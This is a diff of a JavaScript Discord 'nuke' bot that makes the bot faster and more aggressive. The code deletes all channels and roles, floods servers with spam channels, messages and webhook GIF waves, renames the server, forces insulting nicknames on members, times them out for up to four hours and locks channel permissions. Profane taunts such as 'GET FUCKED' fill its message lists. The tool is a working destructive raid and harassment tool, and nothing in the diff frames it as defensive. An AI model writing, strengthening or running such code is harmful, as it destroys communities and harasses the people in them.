@@ -18,10 +18,9 @@ const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
 const PROTECTED_CHANNEL = 'aaaaaaaa';
 
 const NUKE_DURATION = 10 * 60 * 1000;
-const TICK_INTERVAL = 7 * 1000;
+const TICK_INTERVAL = 5 * 1000; // faster
 let nukeActive = false;
 let nukeTimeout = null;
-let currentPhase = 1;
 
 // ================== GIF SLOTS ==================
 const GIF_TYPE_1 = [
@@ -36,9 +35,8 @@ const GIF_TYPE_2 = [
 const SERVER_NAMES = [
   'NUKED', 'HALLUCINATION', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
   'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
-  'REALITY BROKEN', 'CHAOS OVERLOAD', '10 MIN NUKE', 'TOTAL COLLAPSE',
-  'FINAL STAGE', 'NO ESCAPE', 'MINION ARMY', 'WEBHOOK ARMY', 'ARMY ONLINE',
-  'BOSS UPGRADED', 'OVERLORD MODE', 'FULL PRESSURE'
+  'REALITY BROKEN', 'CHAOS OVERLOAD', 'TOTAL COLLAPSE', 'FINAL STAGE',
+  'NO ESCAPE', 'WEBHOOK ARMY', 'ARMY ONLINE', 'BOSS RAGE', 'FULL AGGRO'
 ];
 
 const CHANNEL_NAMES = [
@@ -47,41 +45,41 @@ const CHANNEL_NAMES = [
   'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
   'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
   'minion-spam', 'boss-room', 'collapse', 'broken', 'army', 'flood', 'wave',
-  'boss-flood', 'overlord', 'pressure', 'kill-zone'
+  'aggro', 'rage', 'kill', 'die', 'cry'
 ];
 
 const NICKNAMES = [
   'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
   'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
   'SILENCED', 'BROKEN', 'ARMY TARGET', 'WEBHOOK VICTIM', 'BOSS TARGET',
-  'OVERLORD VICTIM', 'PRESSURED'
+  'RAGE VICTIM', 'AGGRO'
 ];
 
 const ROLE_NAMES = [
   'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion',
   'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Army', 'Flooded',
-  'Boss Marked', 'Overlord', 'Pressure', 'Doomed'
+  'Boss Marked', 'Rage', 'Aggro', 'Doomed'
 ];
 
 const MESSAGES = [
-  '**WEBHOOK ARMY ONLINE**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
+  '**FULL AGGRO**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
   'OWNED', 'THE END', 'RIP SERVER', 'YOU CANNOT STOP THIS', 'BOT WINS',
   'GOODBYE', 'MINIONS ARE HELPING', 'ARMY INCOMING', 'TOO MANY WEBHOOKS',
-  'MUTED', 'SILENCE', '10 MINUTES OF PAIN', 'NO ESCAPE', 'ARMY OVERWHELM',
-  'BOSS UPGRADED', 'FULL PRESSURE', 'OVERLORD MODE', 'FEEL THE BOSS'
+  'MUTED', 'SILENCE', 'NO ESCAPE', 'ARMY OVERWHELM', 'BOSS RAGE',
+  'FULL PRESSURE', 'FEEL IT'
 ];
 
 const ARMY_NAMES = [
   'Minion', 'Army-1', 'Army-2', 'Flood', 'Screamer', 'Null', 'Hunter',
   'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos', 'Destroyer',
-  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord'
+  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord', 'Rage', 'Aggro'
 ];
 
 const ARMY_MESSAGES = [
   'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
   'no survivors', 'mute activated', 'gif spam', 'reality break',
-  'webhook army', 'too many of us', 'flooding now', 'phase shift',
-  'we are many', 'no hope', 'collapse', 'army online', 'boss is stronger'
+  'webhook army', 'too many of us', 'flooding now', 'we are many',
+  'no hope', 'collapse', 'army online', 'boss is raging', 'full aggro'
 ];
 
 // ================== HELPERS ==================
@@ -116,27 +114,22 @@ async function getOrCreateWebhook(channel, name = 'Minion') {
 
 async function safeDelete(channel) {
   if (!channel || channel.name === PROTECTED_CHANNEL) return;
-  await channel.delete('WEBHOOK ARMY NUKE').catch(() => {});
+  await channel.delete('FULL AGGRO NUKE').catch(() => {});
 }
 
-// ================== UPGRADED BOSS ACTIONS ==================
+// ================== AGGRESSIVE BOSS ACTIONS ==================
 const bossActions = [
-  // Server rename
   async (guild) => {
     await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
-    console.log('🔥 Boss renamed server');
   },
 
-  // Mass channel delete
   async (guild) => {
     const channels = [...guild.channels.cache.values()];
     for (const channel of channels) await safeDelete(channel);
-    console.log('🗑️ Boss mass deleted channels');
   },
 
-  // Heavy channel flood
   async (guild) => {
-    for (let i = 0; i < 10; i++) {
+    for (let i = 0; i < 12; i++) {
       try {
         const ch = await guild.channels.create({
           name: randomItem(CHANNEL_NAMES),
@@ -145,45 +138,39 @@ const bossActions = [
         await ch.send(randomItem(MESSAGES)).catch(() => {});
       } catch (e) {}
     }
-    console.log('✨ Boss heavy channel flood');
   },
 
-  // Create + quick delete (pressure)
   async (guild) => {
-    for (let i = 0; i < 6; i++) {
+    for (let i = 0; i < 7; i++) {
       try {
         const ch = await guild.channels.create({
-          name: randomItem(['temp', 'flash', 'glitch', 'army', 'wave', 'pressure']),
+          name: randomItem(['temp', 'flash', 'glitch', 'rage', 'aggro', 'kill']),
           type: ChannelType.GuildText,
         });
-        await ch.send('👁 BOSS').catch(() => {});
-        setTimeout(() => ch.delete().catch(() => {}), 3500 + Math.random() * 4000);
+        await ch.send('👁').catch(() => {});
+        setTimeout(() => ch.delete().catch(() => {}), 2500 + Math.random() * 3500);
       } catch (e) {}
     }
   },
 
-  // Delete all roles
   async (guild) => {
     const roles = [...guild.roles.cache.values()];
     for (const role of roles) {
       if (role.id === guild.id || !role.editable) continue;
-      await role.delete('BOSS UPGRADE').catch(() => {});
+      await role.delete('FULL AGGRO').catch(() => {});
     }
-    console.log('🗑️ Boss deleted roles');
   },
 
-  // Create many roles
   async (guild) => {
-    for (let i = 0; i < 9; i++) {
+    for (let i = 0; i < 10; i++) {
       await guild.roles.create({
         name: randomItem(ROLE_NAMES),
         color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
-        reason: 'BOSS UPGRADE',
+        reason: 'FULL AGGRO',
       }).catch(() => {});
     }
   },
 
-  // Nickname hell
   async (guild) => {
     const members = await guild.members.fetch().catch(() => null);
     if (!members) return;
@@ -191,73 +178,65 @@ const bossActions = [
       if (member.user.bot || !member.manageable) continue;
       await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
     }
-    console.log('👤 Boss nickname hell');
   },
 
-  // Mute hell (upgraded)
   async (guild) => {
     const members = await guild.members.fetch().catch(() => null);
     if (!members) return;
     for (const member of members.values()) {
       if (member.user.bot || !member.moderatable) continue;
-      const time = [300, 600, 900, 1800, 3600, 7200][Math.floor(Math.random() * 6)] * 1000;
-      await member.timeout(time, 'BOSS UPGRADE - MUTED').catch(() => {});
+      const time = [600, 900, 1800, 3600, 7200, 14400][Math.floor(Math.random() * 6)] * 1000;
+      await member.timeout(time, 'FULL AGGRO - MUTED').catch(() => {});
     }
-    console.log('⏳ Boss mute hell');
   },
 
-  // Message spam
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
     );
     for (const channel of channels.values()) {
-      for (let i = 0; i < 6; i++) {
+      for (let i = 0; i < 7; i++) {
         await channel.send(randomItem(MESSAGES)).catch(() => {});
       }
     }
   },
 
-  // Permission destruction
   async (guild) => {
     const channels = guild.channels.cache.filter(c => c.manageable);
     for (const channel of channels.values()) {
       await channel.permissionOverwrites.edit(guild.roles.everyone, {
-        ViewChannel: chance(15),
+        ViewChannel: chance(10),
         SendMessages: false,
         Connect: false,
         Speak: false,
         AddReactions: false,
         AttachFiles: false,
         EmbedLinks: false,
+        UseExternalEmojis: false,
       }).catch(() => {});
     }
-    console.log('🔐 Boss permission destruction');
   },
 
-  // Boss nickname
   async (guild) => {
     await guild.members.me.setNickname(randomItem([
-      'WEBHOOK ARMY', 'ARMY COMMANDER', 'MINION BOSS', 'NUKE BOSS',
-      'OVERLORD', 'BOSS UPGRADED', 'FULL PRESSURE', 'THE DESTROYER'
+      'FULL AGGRO', 'BOSS RAGE', 'ARMY COMMANDER', 'OVERLORD',
+      'THE DESTROYER', 'MUTE MASTER', 'NUKE BOSS'
     ])).catch(() => {});
   },
 
-  // Category chaos
   async (guild) => {
-    for (let i = 0; i < 4; i++) {
+    for (let i = 0; i < 5; i++) {
       try {
         const cat = await guild.channels.create({
-          name: randomItem(['BOSS ZONE', 'ARMY BASE', 'PRESSURE', 'VOID', 'OVERLORD', 'FINAL']),
+          name: randomItem(['RAGE ZONE', 'AGGRO', 'ARMY BASE', 'VOID', 'KILL ZONE', 'FINAL']),
           type: ChannelType.GuildCategory,
         });
-        setTimeout(() => cat.delete().catch(() => {}), 10000 + Math.random() * 15000);
+        setTimeout(() => cat.delete().catch(() => {}), 8000 + Math.random() * 10000);
       } catch (e) {}
     }
   },
 
-  // Role assign hell (new)
   async (guild) => {
     const members = await guild.members.fetch().catch(() => null);
     const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
@@ -268,25 +247,21 @@ const bossActions = [
       const role = randomItem(roles);
       if (role) await member.roles.add(role).catch(() => {});
     }
-    console.log('🎭 Boss role assign hell');
   },
 
-  // Double pressure: nickname + mute
+  // Extra aggressive combo
   async (guild) => {
     const members = await guild.members.fetch().catch(() => null);
     if (!members) return;
     for (const member of members.values()) {
       if (member.user.bot) continue;
       if (member.manageable) await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
-      if (member.moderatable) {
-        await member.timeout(600000, 'BOSS DOUBLE PRESSURE').catch(() => {});
-      }
+      if (member.moderatable) await member.timeout(3600000, 'AGGRO COMBO').catch(() => {});
     }
-    console.log('💀 Boss double pressure');
   },
 ];
 
-// ================== WEBHOOK ARMY SYSTEM ==================
+// ================== AGGRESSIVE WEBHOOK ARMY ==================
 const armyActions = [
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
@@ -294,10 +269,10 @@ const armyActions = [
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
     );
     for (const channel of channels.values()) {
-      for (const name of ARMY_NAMES.slice(0, 8)) {
+      for (const name of ARMY_NAMES.slice(0, 10)) {
         const webhook = await getOrCreateWebhook(channel, name);
         if (!webhook) continue;
-        for (let i = 0; i < 3; i++) {
+        for (let i = 0; i < 4; i++) {
           const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
           await webhook.send({
             content: gif || randomItem(ARMY_MESSAGES),
@@ -306,7 +281,7 @@ const armyActions = [
         }
       }
     }
-    console.log('👾 WEBHOOK ARMY GIF WAVE');
+    console.log('👾 AGGRO ARMY GIF WAVE');
   },
 
   async (guild) => {
@@ -315,7 +290,7 @@ const armyActions = [
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
     );
     for (const channel of channels.values()) {
-      for (let i = 0; i < 5; i++) {
+      for (let i = 0; i < 7; i++) {
         const webhook = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
         if (!webhook) continue;
         await webhook.send({
@@ -324,17 +299,16 @@ const armyActions = [
         }).catch(() => {});
       }
     }
-    console.log('👾 WEBHOOK ARMY TEXT FLOOD');
   },
 
   async (guild) => {
-    for (let i = 0; i < 4; i++) {
+    for (let i = 0; i < 5; i++) {
       try {
         const ch = await guild.channels.create({
-          name: randomItem(['army-spam', 'wave', 'flood-zone', 'minion-army', 'webhook-hell']),
+          name: randomItem(['army-spam', 'rage-wave', 'flood-zone', 'aggro', 'webhook-hell']),
           type: ChannelType.GuildText,
         });
-        for (const name of ARMY_NAMES.slice(0, 4)) {
+        for (const name of ARMY_NAMES.slice(0, 5)) {
           const webhook = await getOrCreateWebhook(ch, name);
           if (!webhook) continue;
           for (let j = 0; j < 3; j++) {
@@ -347,7 +321,6 @@ const armyActions = [
         }
       } catch (e) {}
     }
-    console.log('👾 ARMY CREATED SPAM CHANNELS');
   },
 
   async (guild) => {
@@ -357,7 +330,7 @@ const armyActions = [
       if (!webhook) continue;
       await webhook.send({
         content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸', '⚔️']),
-        username: randomItem(['Glitch', 'Null', 'Error', 'Void']),
+        username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
       }).catch(() => {});
     }
   },
@@ -372,13 +345,12 @@ const armyActions = [
       if (!webhook) continue;
       await webhook.send({
         content: randomItem([
-          'ARMY WAVE INCOMING',
+          'FULL AGGRO WAVE',
           'TOO MANY WEBHOOKS',
           'YOU CANNOT STOP THE ARMY',
-          'PHASE OVERLOAD',
+          'BOSS IS RAGING',
           'WEBHOOK ARMY ACTIVE',
-          'MINIONS EVERYWHERE',
-          'BOSS IS STRONGER NOW'
+          'NO ESCAPE'
         ]),
         username: 'Hunter',
       }).catch(() => {});
@@ -393,23 +365,23 @@ async function runNukeTick(guild) {
     return;
   }
 
-  console.log(`\n======== WEBHOOK ARMY + UPGRADED BOSS TICK on ${guild.name} ========`);
+  console.log(`\n======== FULL AGGRO TICK on ${guild.name} ========`);
 
-  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, 9);
+  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, 11);
   for (const action of selectedBoss) {
     try {
       await action(guild);
-      await sleep(90);
+      await sleep(70);
     } catch (err) {
       console.error('❌ Boss:', err.message);
     }
   }
 
-  const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, 4);
+  const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, 5);
   for (const action of selectedArmy) {
     try {
       await action(guild);
-      await sleep(80);
+      await sleep(60);
     } catch (err) {
       console.error('❌ Army:', err.message);
     }
@@ -424,9 +396,9 @@ async function startNuke(guild, message) {
   }
 
   nukeActive = true;
-  if (message) await message.reply('💣 **WEBHOOK ARMY + UPGRADED BOSS NUKE STARTED**');
+  if (message) await message.reply('💣 **FULL AGGRO NUKE STARTED**');
 
-  console.log('💣 WEBHOOK ARMY + UPGRADED BOSS NUKE STARTED');
+  console.log('💣 FULL AGGRO NUKE STARTED');
 
   await runNukeTick(guild);
 
@@ -438,14 +410,14 @@ async function startNuke(guild, message) {
   nukeTimeout = setTimeout(() => {
     nukeActive = false;
     clearInterval(interval);
-    console.log('🛑 NUKE ENDED');
+    console.log('🛑 FULL AGGRO NUKE ENDED');
   }, NUKE_DURATION);
 }
 
 // ================== EVENTS ==================
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
-  console.log(`💣 WEBHOOK ARMY + UPGRADED BOSS READY`);
+  console.log(`💣 FULL AGGRO NUKE BOT READY`);
 });
 
 client.on('messageCreate', async (message) => {
